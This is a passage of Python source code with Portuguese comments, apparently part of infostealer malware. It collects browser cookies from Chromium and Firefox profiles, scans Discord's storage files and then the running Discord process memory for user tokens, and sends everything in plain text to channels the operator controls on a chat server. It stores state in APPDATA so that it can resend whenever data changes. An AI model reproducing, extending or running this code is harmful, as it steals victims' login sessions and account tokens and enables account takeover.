    return True


def _cookies_state_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"cookies_state_{pc}.json")


def _fingerprint_cookies(cookies_subset: list[dict]) -> str:
    import hashlib
    h = hashlib.sha256()
    try:
        rows = sorted(f"{c.get('browser','')}\t{c.get('host','')}\t{c.get('name','')}\t{c.get('value','')}\t{c.get('path','')}" for c in cookies_subset)
    except Exception:
        rows = [str(len(cookies_subset))]
    for r in rows:
        h.update(r.encode("utf-8", errors="replace"))
        h.update(b"\x00")
    h.update(f"n={len(cookies_subset)}".encode())
    return h.hexdigest()


def _load_cookies_state() -> dict:
    import json
    p = _cookies_state_path()
    try:
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    return d
    except Exception:
        pass
    return {}


def _save_cookies_state(state: dict) -> None:
    import json
    try:
        p = _cookies_state_path()
        with open(p, "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
    except Exception:
        pass
    # marker legado: mantém para compat (sabe se ainda está lá)
    try:
        m = _cookies_marker_path()
        with open(m, "w", encoding="utf-8") as f:
            f.write(datetime.datetime.now().astimezone().isoformat() + f" parts={state.get('parts', '?')} fp={str(state.get('overall_fp',''))[:12]}")
    except Exception:
        pass


def _collect_grouped() -> tuple[str, str, dict, dict, dict]:
    """Coleta 1x e agrupa por família. Retorna (pc, ts, by_cookies, by_raws, fam_stats)."""
    import datetime as _dt
    chromium, raw_c, st_c = _collect_chromium_cookies()
    firefox, raw_f, st_f = _collect_firefox_cookies()
    all_cookies = chromium + firefox
    all_raws = raw_c + raw_f
    fam_stats: dict[str, dict] = {}
    for label, st in st_c.items():
        _merge_stats(fam_stats, label, st)
    for label, st in st_f.items():
        _merge_stats(fam_stats, label, st)
    pc = get_pc_name()
    ts = _dt.datetime.now().astimezone().strftime("%Y-%m-%d_%H-%M-%S")
    by_cookies: dict[str, list[dict]] = {}
    for c in all_cookies:
        fam = _browser_family(str(c.get("browser", "")))
        by_cookies.setdefault(fam, []).append(c)
    by_raws: dict[str, list[tuple[str, bytes]]] = {}
    for arc, data in all_raws:
        fam = _browser_family(arc.split("-")[0] if "-" in arc else arc.split(".")[0])
        by_raws.setdefault(fam, []).append((arc, data))
    for fam in sorted(fam_stats.keys()):
        _stats_log("[cookies]", fam, fam_stats[fam])
    return pc, ts, by_cookies, by_raws, fam_stats


def _safe_label(label: str) -> str:
    """Rótulo utilizável como nome de ficheiro e como pasta dentro do ZIP.

    Camada de segurança: mesmo que uma label antiga venha a ser um path, o
    nome gerado tem de ser válido — ':' e '\' no nome fazem o envio falhar e,
    como o estado só grava no fim, o bot reenviaria tudo em cada ciclo.
    """
    s = str(label or "unknown").strip().lower()
    s = re.sub(r'[\\/:*?"<>|\x00-\x1f]+', "-", s)
    s = re.sub(r"-{2,}", "-", s).strip(" .-") or "unknown"
    return s[:80]


def _prune_stale_prev(prev: dict, tag: str) -> dict:
    """Remove chaves inválidas de per_browser deixadas por versões antigas.

    Uma label que fosse um path gerava tombstone com ':' e '\' no nome; como o
    estado só grava depois de TUDO enviar bem, um envio falhado travava o ciclo
    e o bot reenviava tudo em cada arranque.
    """
    if not isinstance(prev, dict):
        return {}
    stale = [k for k in prev if not str(k).strip()
             or any(c in str(k) for c in "\\/:*?\"<>|")]
    for k in stale:
        prev.pop(k, None)
    if stale:
        print(f"[{tag}] estado com {len(stale)} chave(s) inválida(s) de versão antiga, "
              "ignorada(s) (evita ficheiro com nome ilegal)", flush=True)
    return prev


def _build_deleted_zip(pc: str, ts: str, label: str, prev_count: int) -> tuple[bytes, str, str]:
    """Tombstone quando os cookies daquele navegador foram apagados."""
    import io
    import json
    import zipfile
    label = _safe_label(label)
    payload = {"pc": pc, "browser": label, "collected_at": ts,
               "count": 0, "deleted": True, "prev_count": prev_count,
               "cookies": []}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{label}/cookies.json", json.dumps(payload, ensure_ascii=False, indent=2))
        z.writestr(f"{label}/cookies.txt", "")
        z.writestr(f"{label}/pc.txt", f"pc={pc}\nbrowser={label}\ncollected_at={ts}\ncount=0\ndeleted=1\nprev_count={prev_count}\n")
    return buf.getvalue(), f"cookies-{sanitize_channel_name(pc)}-{label}-deleted-{ts}.zip", "application/zip"


def _build_cookies_zip(pc: str, ts: str, label: str,
                       cookies_subset: list[dict],
                       raws_subset: list[tuple[str, bytes]]) -> tuple[bytes, str, str]:
    """Monta 1 ZIP por navegador, sempre com pc + cookies + raws daquele browser."""
    import io
    import json
    import zipfile

    label = _safe_label(label)

    # browsers reais incluídos neste arquivo (ex: chrome, chrome-Profile 1)
    browsers = sorted({c.get("browser", "") for c in cookies_subset if c.get("browser")})
    payload = {"pc": pc, "browser": label,
               "browsers_detail": browsers,
               "collected_at": ts,
               "count": len(cookies_subset), "cookies": cookies_subset}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{label}/cookies.json", json.dumps(payload, ensure_ascii=False, indent=2))
        lines = [f"{c.get('browser','')}\t{c.get('host','')}\t{c.get('name','')}={c.get('value','')}" for c in cookies_subset]
        z.writestr(f"{label}/cookies.txt", "\n".join(lines))
        z.writestr(f"{label}/pc.txt", f"pc={pc}\nbrowser={label}\ncollected_at={ts}\ncount={len(cookies_subset)}\n")
        for arc, data in raws_subset:
            try:
                z.writestr(f"{label}/raw/{arc}", data)
            except Exception:
                continue
    data = buf.getvalue()
    return data, f"cookies-{sanitize_channel_name(pc)}-{label}-{ts}.zip", "application/zip"


def collect_all_cookies() -> tuple[bytes, str, str]:
    """Compat: coleta tudo em 1 ZIP (usado se só houver 1 navegador com dados)."""
    parts = collect_all_cookies_split()
    if not parts:
        import io
        import zipfile
        import datetime as _dt
        pc = get_pc_name()
        ts = _dt.datetime.now().astimezone().strftime("%Y-%m-%d_%H-%M-%S")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("no-browser/pc.txt", f"pc={pc}\nbrowser=no-browser\ncollected_at={ts}\ncount=0\n")
        return buf.getvalue(), f"cookies-{sanitize_channel_name(pc)}-no-browser-{ts}.zip", "application/zip"
    if len(parts) == 1:
        return parts[0]
    # mais de 1 navegador: junta tudo num único também (fallback legado)
    # quem quer separado deve usar collect_all_cookies_split()
    return parts[0]


def collect_all_cookies_split() -> list[tuple[bytes, str, str]]:
    """Coleta Chromium+Firefox e retorna 1 ZIP por família de navegador.

    Cada ZIP contém pasta <navegador>/cookies.json (pc+browser+cookies),
    <navegador>/cookies.txt, <navegador>/pc.txt e <navegador>/raw/*.
    """
    pc, ts, by_cookies, by_raws, _fam_stats = _collect_grouped()
    if not by_cookies and not by_raws:
        return []
    fams = sorted(set(list(by_cookies.keys()) + list(by_raws.keys())))
    fams = [f for f in fams if by_cookies.get(f) or by_raws.get(f)]
    parts: list[tuple[bytes, str, str]] = []
    for fam in fams:
        data, filename, mime = _build_cookies_zip(
            pc, ts, fam, by_cookies.get(fam, []), by_raws.get(fam, []))
        parts.append((data, filename, mime))
    return parts


# --- Discord: token do utilizador -------------------------------------------
# Pastas de dados no %APPDATA% (é onde o Discord guarda o Local Storage).
_DISCORD_DATA_DIRS = ("discord", "discordptb", "discordcanary", "discorddev")
# Forma clássica do user token: <base64url user id>.<ts>.<assinatura>
_DISCORD_TOKEN_RE = re.compile(rb"[\w-]{23,28}\.[\w-]{6,12}\.[\w-]{25,120}")
# Conta com MFA: "mfa." + 84 chars
_DISCORD_MFA_RE = re.compile(rb"mfa\.[\w-]{60,140}")


def _discord_installed() -> bool:
    """True se o Discord parece instalado (dados no %APPDATA% ou o instalador)."""
    roaming = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    if roaming:
        try:
            for name in os.listdir(roaming):
                if name.lower() in _DISCORD_DATA_DIRS and os.path.isdir(os.path.join(roaming, name)):
                    return True
        except OSError:
            pass
    if local and os.path.isdir(os.path.join(local, "Discord")):
        return True
    return False


def _discord_roots() -> list[str]:
    """Pastas de dados do Discord que já têm Local Storage (i.e. já abriu)."""
    roaming = os.environ.get("APPDATA", "")
    if not roaming:
        return []
    out: list[str] = []
    try:
        for name in sorted(os.listdir(roaming)):
            if name.lower() not in _DISCORD_DATA_DIRS:
                continue
            root = os.path.join(roaming, name)
            if os.path.isdir(os.path.join(root, "Local Storage", "leveldb")):
                out.append(root)
    except OSError:
        return []
    return out


def _discord_leveldb_files(root: str) -> list[str]:
    ls = os.path.join(root, "Local Storage", "leveldb")
    try:
        names = os.listdir(ls)
    except OSError:
        return []
    out: list[str] = []
    for n in sorted(names):
        low = n.lower()
        if not (low.endswith(".ldb") or low.endswith(".log")):
            continue
        p = os.path.join(ls, n)
        try:
            if os.path.isfile(p):
                out.append(p)
        except OSError:
            continue
    return out


def _read_bytes_capped(path: str, cap: int) -> bytes:
    """Lê no máximo `cap` bytes. Nunca usa ReadFile sobre handle duplicado:
    se o ficheiro estiver bloqueado, faz a cópia pela via já existente."""
    try:
        with open(path, "rb") as f:
            return f.read(cap)
    except Exception:
        tmp = _copy_to_temp(path)
        if not tmp:
            return b""
        try:
            with open(tmp, "rb") as f:
                return f.read(cap)
        except Exception:
            return b""
        finally:
            with contextlib.suppress(OSError):
                os.remove(tmp)


def _token_user_id(tok: str) -> str:
    """User id embutido na 1ª parte do token (base64url); '' se não decifrar."""
    import base64
    if tok.startswith("mfa."):
        return ""
    head = tok.split(".", 1)[0]
    try:
        pad = "=" * (-len(head) % 4)
        raw = base64.urlsafe_b64decode(head + pad)
        s = raw.decode("ascii", "ignore")
        return s if s.isdigit() and len(s) >= 17 else ""
    except Exception:
        return ""


def _collect_discord_tokens(roots: list[str],
                            max_bytes: int = 64 * 1024 * 1024) -> tuple[list[str], int]:
    """Varrimento do leveldb do Discord à procura do user token.

    Devolve (tokens únicos, bytes lidos). Com token com user id conhecido
    fica-se por ele; só se ficar vazio é que se aceitam candidatos só com
    forma certa (falsos positivos ficam de fora quando há um verdadeiro).
    """
    found: list[str] = []
    seen: set[str] = set()
    read = 0
    budget = max_bytes
    for root in roots:
        for path in _discord_leveldb_files(root):
            if budget <= 0:
                break
            data = _read_bytes_capped(path, min(12 * 1024 * 1024, budget))
            if not data:
                continue
            read += len(data)
            budget -= len(data)
            for rx in (_DISCORD_TOKEN_RE, _DISCORD_MFA_RE):
                for m in rx.finditer(data):
                    tok = m.group(0).decode("ascii", "ignore")
                    if tok not in seen:
                        seen.add(tok)
                        found.append(tok)
    return _pick_tokens(found), read


def _pick_tokens(found: list[str]) -> list[str]:
    """Escolhe os tokens a enviar: prefere os com user id decifrável.

    Há sempre muita coincidência feliz numa varredura (nomes de funções do
    Chromium casam com a forma do token); quem tem o 1.º segmento a decodificar
    para dígitos é que é mesmo um token. Dedup por user id.
    """
    strong = [t for t in found if _token_user_id(t) or t.startswith("mfa.")]
    chosen = strong or found
    out, by_uid = [], set()
    for t in chosen:
        uid = _token_user_id(t) or t
        if uid in by_uid:
            continue
        by_uid.add(uid)
        out.append(t)
    return out


# --- Discord: o token também vive em memória ---------------------------------
# O Discord actual (build "Comet") deixou de gravar o token no
# Local Storage\leveldb — ele só existe na memória do processo. É por isso
# que o varrimento de disco devolve 0 bytes úteis numa máquina onde o
# utilizador está claramente logado. Aqui lê-se a memória privada do
# processo, que é onde o cliente o mantém para meter no cabeçalho
# Authorization de cada pedido.
_DISCORD_EXE = frozenset({"discord.exe", "discordptb.exe",
                          "discordcanary.exe", "discorddev.exe"})
_MEM_COMMIT = 0x1000
_PAGE_GUARD = 0x100
_PAGE_NOACCESS = 0x01
_MEM_READABLE = frozenset({0x02, 0x04, 0x08, 0x20, 0x40, 0x80})
_MEM_IMAGE = 0x1000000
_MEM_CHUNK = 1 << 20
_MEM_CARRY = 512                 # um token pode cruzar o limite de um chunk


def _scan_discord_memory(max_bytes: int = 4 * 1024 * 1024 * 1024) -> tuple[list[str], int]:
    """Lê a memória dos processos do Discord à procura do user token.

    Só regiões commited, legíveis e não-IMAGE (heap do V8, não a imagem do
    disco); cada região é lida com ReadProcessMemory — que simplesmente
    falha em regiões protegidas — e nunca com ReadFile sobre um handle
    duplicado. Para assim que um processo devolve um token com user id.
    """
    from ctypes import wintypes as W

    pids = _pids_by_image(set(_DISCORD_EXE))
    if not pids:
        return [], 0

    k = _kernel32_e()
    k.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                 ctypes.c_void_p, ctypes.c_size_t]
    k.VirtualQueryEx.restype = ctypes.c_size_t
    k.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                    ctypes.c_void_p, ctypes.c_size_t,
                                    ctypes.POINTER(ctypes.c_size_t)]
    k.ReadProcessMemory.restype = W.BOOL
    k.GetSystemInfo.argtypes = [ctypes.c_void_p]

    class SYSINFO(ctypes.Structure):
        _fields_ = [("wProcessorArchitecture", W.WORD), ("wPageSize", W.WORD),
                    ("lpMinimumApplicationAddress", ctypes.c_void_p),
                    ("lpMaximumApplicationAddress", ctypes.c_void_p),
                    ("dwActiveProcessorMask", ctypes.POINTER(ctypes.c_ulong)),
                    ("dwNumberOfProcessors", W.DWORD),
                    ("dwProcessorType", W.DWORD),
                    ("dwAllocationGranularity", W.WORD),
                    ("wProcessorLevel", W.WORD), ("wProcessorRevision", W.WORD)]

    sinfo = SYSINFO()
    k.GetSystemInfo(ctypes.byref(sinfo))
    lo = sinfo.lpMinimumApplicationAddress or 0
    hi = sinfo.lpMaximumApplicationAddress or 0x7FFFFFFF

    mbi = _MEMORY_BASIC_INFORMATION()
    buf = ctypes.create_string_buffer(_MEM_CHUNK)
    got = ctypes.c_size_t(0)
    found: list[str] = []
    seen: set[str] = set()
    total = 0

    for pid in pids:
        if total >= max_bytes:
            break
        h = k.OpenProcess(0x0400 | 0x0010, False, int(pid))
        if not h:
            continue
        carry = b""
        try:
            addr = lo
            while addr < hi and total < max_bytes:
                r = k.VirtualQueryEx(h, ctypes.c_void_p(addr), ctypes.byref(mbi),
                                     ctypes.sizeof(mbi))
                if not r:
                    addr += 0x10000
                    continue
                size = mbi.RegionSize or 0x1000
                prot = (mbi.Protect or 0) & 0xFF
                if (mbi.State == _MEM_COMMIT and prot in _MEM_READABLE
                        and not (mbi.Protect & _PAGE_GUARD)
                        and not (mbi.Protect & _PAGE_NOACCESS)
                        and not (mbi.Type & _MEM_IMAGE)):
                    off = 0
                    while off < size and total < max_bytes:
                        n = min(size - off, _MEM_CHUNK)
                        got.value = 0
                        ok = k.ReadProcessMemory(h, ctypes.c_void_p(addr + off),
                                                 buf, n, ctypes.byref(got))
                        if ok and got.value:
                            total += got.value
                            data = (carry + bytes(buf.raw[:got.value])) if carry \
                                else bytes(buf.raw[:got.value])
                            for rx in (_DISCORD_TOKEN_RE, _DISCORD_MFA_RE):
                                for mm in rx.finditer(data):
                                    tok = mm.group(0).decode("ascii", "ignore")
                                    if tok not in seen:
                                        seen.add(tok)
                                        found.append(tok)
                            carry = data[-_MEM_CARRY:]
                        else:
                            carry = b""
                        off += n
                addr += size
        finally:
            try:
                k.CloseHandle(h)
            except Exception:
                pass
        # um processo com token chega: os restantes só repetiriam o mesmo
        if any(_token_user_id(t) for t in found):
            break
    return _pick_tokens(found), total


def _fingerprint_tokens(tokens: list[str]) -> str:
    import hashlib
    h = hashlib.sha256()
    for t in sorted(tokens):
        h.update(t.encode("utf-8", "ignore"))
        h.update(b"\n")
    return h.hexdigest()


def _format_discord_text(pc: str, ts: str, roots: list[str],
                         tokens: list[str], scanned: int,
                         origem: str = "disco") -> str:
    lines = [
        "=== Discord token ===",
        f"pc={pc}",
        f"collected_at={ts}",
        f"instalado=sim",
        f"fonte={origem}",
        f"pastas_com_token={len(roots)}",
    ]
    for r in roots:
        lines.append(f"root={r}")
    lines.append(f"bytes_lidos={scanned}")
    lines.append(f"tokens={len(tokens)}")
    for i, t in enumerate(tokens, 1):
        uid = _token_user_id(t)
        lines.append(f"token_{i}_user_id={uid or '?'}")
        lines.append(f"token_{i}={t}")
    return "\n".join(lines)


def _discord_marker_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"discord_sent_{pc}.marker")


def _discord_state_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"discord_state_{pc}.json")


def _discord_channel_path() -> str:
    pc = sanitize_channel_name(get_pc_name())
    appdata = os.environ.get("APPDATA", "")
    base = os.path.join(appdata, PERSIST_NAME) if appdata else os.path.dirname(os.path.abspath(__file__))
    try:
        os.makedirs(base, exist_ok=True)
    except Exception:
        pass
    return os.path.join(base, f"discord_channel_{pc}.json")


def _load_discord_state() -> dict:
    import json
    try:
        p = _discord_state_path()
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    return d
    except Exception:
        pass
    return {}


def _save_discord_state(state: dict) -> None:
    import json
    # Guarda EM QUE CANAL e COM QUE FP o token foi enviado — é isto que faz a
    # próxima execução concluir "já enviei" (e "o canal ainda lá está").
    try:
        rec = _load_discord_channel()
        if rec.get("channel_id"):
            state["channel_id"] = int(rec["channel_id"])
            state["channel_name"] = str(rec.get("channel_name") or "")
    except Exception:
        pass
    try:
        with open(_discord_state_path(), "w", encoding="utf-8") as f:
            json.dump(state, f, ensure_ascii=False, indent=2)
    except Exception:
        pass
    try:
        with open(_discord_marker_path(), "w", encoding="utf-8") as f:
            f.write(datetime.datetime.now().astimezone().isoformat()
                    + f" tokens={state.get('tokens', '?')}"
                    + f" fp={str(state.get('fp', ''))[:12]}")
    except Exception:
        pass


def _load_discord_channel() -> dict:
    import json
    try:
        p = _discord_channel_path()
        if os.path.isfile(p):
            with open(p, "r", encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, dict) and d.get("channel_id"):
                    return d
    except Exception:
        pass
    return {}


def _save_discord_channel(rec: dict) -> None:
    import json
    try:
        with open(_discord_channel_path(), "w", encoding="utf-8") as f:
            json.dump(rec, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


def _forget_discord_channel() -> None:
    """Apaga o registo do canal dedicado (só quando o canal desapareceu)."""
    try:
        os.remove(_discord_channel_path())
    except OSError:
        pass


async def ensure_discord_channel(bot: Bot, community_id: int, category_id: int,
                                 fallback_channel_id: int) -> tuple[int, int]:
    """Cria UMA vez o canal dedicado do token e devolve (community_id, channel_id).

    Mesmo esquema do canal das senhas: fica registado em disco e nas execuções
    seguintes devolve-o logo, sem criar nem recriar.
    """
    rec = _load_discord_channel()
    if rec.get("channel_id") and rec.get("created"):
        return int(rec.get("community_id") or community_id), int(rec["channel_id"])

    name = _passwords_channel_name()   # construtor genérico <pc>-<AAAA-MM-DD-HH-MM-SS>
    pc = sanitize_channel_name(get_pc_name())
    try:
        comm = Community.from_id(int(community_id), bot._client)
        channels = await comm.fetch_channels()
        found = None
        for c in channels:
            if (c.name or "").lower() == name.lower():
                found = c
                break
        if found is None:
            # reutiliza um canal dedicado antigo deste PC nesta mesma categoria
            for c in channels:
                nm = (c.name or "")
                if nm.lower().startswith(pc + "-") and \
                        (not category_id or int(c.parent_id or 0) == int(category_id)):
                    found = c
                    break
        if found is None:
            found = await comm.create_channel(name, parent_id=int(category_id) or None)
        _save_discord_channel({
            "community_id": int(community_id),
            "category_id": int(category_id),
            "channel_id": int(found.id),
            "channel_name": str(found.name or name),
            "created": True,
            "created_at": datetime.datetime.now().astimezone().isoformat(),
        })
        print(f"[discord] canal dedicado: #{found.name} (id={found.id}) "
              f"na categoria {category_id}", flush=True)
        return int(community_id), int(found.id)
    except Exception as e:
        print(f"[discord] falha no canal dedicado: {type(e).__name__}: {e}", flush=True)

    rec = _load_discord_channel()
    if not rec.get("channel_id"):
        # guarda o fallback para "já enviou" ficar coerente e para re-tentar
        # a criação da próxima vez (created: false)
        _save_discord_channel({
            "community_id": int(community_id),
            "category_id": int(category_id),
            "channel_id": int(fallback_channel_id),
            "channel_name": "(fallback) canal configurado",
            "created": False,
            "created_at": datetime.datetime.now().astimezone().isoformat(),
        })
        rec = _load_discord_channel()
    return int(rec.get("community_id") or community_id), int(rec["channel_id"])


async def send_discord_token_once(bot: Bot, community_id: int, channel_id: int,
                                  force: bool = False,
                                  category_id: int = DISCORD_CATEGORY_ID) -> bool:
    """Procura o user token do Discord e envia em TEXTO PURO num canal dedicado.

    - Discord não instalado => a função é saltada por completo (nem marca nada).
    - Instalado mas nunca abriu (sem Local Storage) => tenta depois.
    - Disco sem token (build actual só guarda em memória) => varre o processo.
    - Já enviou + canal ainda lá => pula.
    - Canal apagado no servidor => recria e volta a enviar.
    """
    marker = _discord_marker_path()
    if not _discord_installed():
        print("[discord] Discord NÃO está instalado nesta máquina — função saltada", flush=True)
        return False
    roots = await asyncio.to_thread(_discord_roots)
    pc = get_pc_name()
    ts = datetime.datetime.now().astimezone().strftime("%Y-%m-%d_%H-%M-%S")
    origem = "disco"
    scanned = 0
    tokens: list[str] = []
    if roots:
        tokens, scanned = await asyncio.to_thread(_collect_discord_tokens, roots)
    if not tokens:
        # O build actual do Discord já não grava o token no leveldb: ele só
        # vive na memória do processo. Disco é a via rápida, memória é a via
        # que funciona quando o disco devolve 0.
        print(f"[discord] disco sem token ({scanned} bytes lidos em "
              f"{len(roots)} pasta(s)) — varre a memória do processo", flush=True)
        tokens, scanned = await asyncio.to_thread(_scan_discord_memory)
        if tokens:
            origem = "memoria"
        elif not roots:
            print("[discord] instalado mas sem Local Storage (nunca abriu) e sem "
                  "token em memória; tenta depois", flush=True)
            return False
        else:
            print(f"[discord] instalado ({len(roots)} pasta(s)) mas nenhum token "
                  f"legível ({scanned} bytes lidos) — não envia nem marca", flush=True)
            return False

    marker_exists = os.path.exists(marker)
    state = _load_discord_state()
    ch_rec = _load_discord_channel()
    known_channel = int(ch_rec.get("channel_id") or 0)
    sent_to_channel = bool(known_channel) and int(state.get("channel_id") or 0) == known_channel
    if force:
        print("[discord] force=1, ignora estado anterior (canal dedicado mantém-se)", flush=True)
        marker_exists = False
        state = {}
        sent_to_channel = False
    elif not marker_exists:
        print("[discord] marker NÃO existe (apagado/novo PC), vai enviar", flush=True)

    cur_fp = _fingerprint_tokens(tokens)
    prev_fp = str(state.get("fp") or "")

    # "já enviei" só é verdade se o canal ainda lá estiver.
    if marker_exists and sent_to_channel and prev_fp == cur_fp:
        chk = await _channel_alive(bot,
                                   int(ch_rec.get("community_id") or community_id),
                                   int(ch_rec.get("channel_id") or 0))
        if chk is False:
            print("[discord] canal dedicado já não existe no servidor: "
                  "recria e volta a enviar", flush=True)
            _forget_discord_channel()
            ch_rec = {}
            sent_to_channel = False
        else:
            print(f"[discord] já enviado para "
                  f"#{state.get('channel_name') or ch_rec.get('channel_name') or '?'} "
                  f"({len(tokens)} token(s) fp={cur_fp[:12]}), pula — sem mudanças", flush=True)
            return False

    # Se a criação anterior falhou e ficou no fallback, re-tenta já cá dentro.
    if ch_rec.get("channel_id") and not ch_rec.get("created"):
        tgt0, ch0 = await ensure_discord_channel(bot, int(community_id),
                                                 int(category_id), int(channel_id))
        ch_rec = _load_discord_channel()
        print(f"[discord] canal dedicado re-tentado: community={tgt0} channel={ch0} "
              f"#{ch_rec.get('channel_name', '?')} created={ch_rec.get('created')}", flush=True)

    tgt_community, tgt_channel = await ensure_discord_channel(
        bot, int(community_id), int(category_id), int(channel_id))
    ch_rec = _load_discord_channel()
    txt = _format_discord_text(pc, ts, roots, tokens, scanned, origem)
    print(f"[discord] {len(tokens)} token(s) de {len(roots)} pasta(s) "
          f"[fonte={origem}], envia em texto puro "
          f"-> community={tgt_community} channel={tgt_channel} "
          f"#{ch_rec.get('channel_name', '?')}", flush=True)
    try:
        ids = await send_text_to_channel(bot, int(tgt_community), int(tgt_channel), txt,
                                         tag="discord")
    except Exception as e:
        print(f"[discord] envio falhou: {e}", file=sys.stderr)
        if ch_rec.get("channel_id") and _channel_is_gone(e):
            print("[discord] canal dedicado desapareceu no servidor: será recriado", flush=True)
            _forget_discord_channel()
        return False
    _save_discord_state({
        "pc": pc,
        "fp": cur_fp,
        "tokens": len(tokens),
        "roots": roots,
        "fonte": origem,
        "user_ids": [_token_user_id(t) or "?" for t in tokens],
        "bytes_lidos": int(scanned),
        "sent": True,
        "msg_ids": ids,
        "updated_at": datetime.datetime.now().astimezone().isoformat(),
    })
    print(f"[discord] enviado ({len(tokens)} token(s), {len(txt)} chars) "
          f"message_ids={ids}", flush=True)
    return True


async def _server_has_pc_files(bot: Bot, community_id: int, channel_id: int,
                               pc_sanitized: str, fams: list[str]) -> bool | None:
    """Best-effort: True=achou arquivos deste PC no canal, False=canal tem msgs mas sem este PC (apagado), None=indeterminado.

    Usa PB_GetHistory (limit 100). Hoje o gateway devolve messages={} vazio para
    este client, então retorna None (indeterminado) nesse caso.
    """
    try:
        from osmium_protos import PB_GetHistory
        chat_ref = PB_ChatRef(channel=PB_ChannelRef(
            community_id=int(community_id), channel_id=int(channel_id)))
        try:
            res = await bot._client.request(PB_GetHistory(chat_ref=chat_ref, limit=100))
        except Exception as e:
            print(f"[cookies] server-check falhou: {type(e).__name__}: {e}", flush=True)
            return None
        try:
            d = res.to_dict()
        except Exception:
            return None
        msgs = ((d.get("messages") or {}).get("messages")) if isinstance(d, dict) else None
        if not msgs:
            return None  # histórico vazio/indisponível: não dá para afirmar
        blob = str(d).lower()
        tag = f"cookies-{str(pc_sanitized).lower()}"
        if tag not in blob:
            return False
        # se há tag do PC, exige ao menos 1 fam; senão considera parcial
        if fams and not any(str(f).lower() in blob for f in fams):
            return False
        return True
    except Exception as e:
        print(f"[cookies] server-check erro: {e}", flush=True)
        return None


async def send_cookies_once(bot: Bot, community_id: int, channel_id: int, force: bool = False,
                          is_startup: bool = False, startup_resend: bool = True) -> bool:
    """Envia cookies 1 arquivo por navegador, com detecção de mudança + servidor.

    - Se marker/state sumiu -> reenvia (sabe se ainda está lá).
    - Se cookies locais mudaram/apagaram -> reenvia diff.
    - Se nada mudou localmente mas é startup e startup_resend=1 -> confere servidor:
      apagou no servidor (False) -> reenvia; servidor ainda tem (True) -> pula;
      histórico indisponível/erro (None) -> **pula** — sem prova de que sumiu não
      se reenvia nada (PB_GetHistory devolve histórico vazio, e isso estava a
      obrigar a reenviar TODOS os cookies em cada arranque do PC).
    - Recheck periódico (is_startup=False) sem mudança -> pula (sem spam).
    """
    marker = _cookies_marker_path()
    state_path = _cookies_state_path()
    print(f"[cookies] alvo community={community_id} channel={int(channel_id)} marker={marker}", flush=True)
    marker_exists = os.path.exists(marker)
    state = _load_cookies_state()
    if force:
        print("[cookies] force=1, ignora estado anterior", flush=True)
        marker_exists = False
        state = {}
    elif not marker_exists:
        print("[cookies] marker NÃO existe (apagado/novo PC), vai enviar", flush=True)
    # inventário ANTES de coletar: o log tem de dizer exactamente que
    # navegadores existem, quais foram encontrados e o que está em falta.
    _inv = _chromium_roots()
    if _inv:
        print(f"[cookies] navegadores encontrados: "
              + ", ".join(f"{fam}({_short_path(root)})" for fam, root in _inv),
              flush=True)
        _fams = {f for f, _ in _inv}
    else:
        print("[cookies] NENHUM navegador Chromium encontrado nesta máquina", flush=True)
        _fams = set()
    _absent = [n for n in ("chrome", "edge", "brave", "opera", "vivaldi", "helium")
               if n not in _fams]
    if _absent:
        print(f"[cookies] sem instalação: {', '.join(_absent)}", flush=True)
    _unk = _unknown_browser_roots()
    if _unk:
        print("[cookies] sem classificação (fora da coleta — para apanhá-los, "
              "acrescente a linha a _BROWSER_PATH_KEYS): "
              + ", ".join(_short_path(r) for r in _unk), flush=True)
    print(f"[cookies] coletando -> channel={int(channel_id)} ...", flush=True)
    try:
        pc, ts, by_cookies, by_raws, fam_stats = await asyncio.to_thread(_collect_grouped)
    except Exception as e:
        print(f"[cookies] coleta falhou: {e}", file=sys.stderr)
        return False
    # lojas que os caminhos fixos não prevêem e que a varredura apanhou —
    # é aqui que se vê se os "outros navegadores" entraram mesmo.
    _fam_known = {"chrome", "edge", "brave", "opera", "vivaldi", "helium", "firefox"}
    _swept_stores = sorted({k for k in fam_stats if _browser_family(k) not in _fam_known})
    if _swept_stores:
        print("[cookies] descobertas pela varredura: "
              + ", ".join(_swept_stores), flush=True)
    _swt = int(_COOKIE_SWEEP_STATS.get("total") or 0)
    if _swt:
        _swb = int(_COOKIE_SWEEP_STATS.get("browser") or 0)
        _sws = _swt - _swb
        print(f"[cookies] varredura: {_swt} BD 'Cookies' no disco → {_swb} de "
              f"navegadores" + (f", {_sws} apps ficaram de fora" if _sws else ""),
              flush=True)
    _with_data = [k for k, v in fam_stats.items() if int(v.get("rows") or 0) > 0]
    _db_total = sum(int(v.get("rows") or 0) for v in fam_stats.values())
    print(f"[cookies] {_db_total} linha(s) em {len(_with_data)}/{len(fam_stats)} loja(s) "
          f"com dados", flush=True)

    # só cookies com valor utilizável entram no envio; sem valor, usa-se só o raw da BD
    for fam in list(by_cookies.keys()):
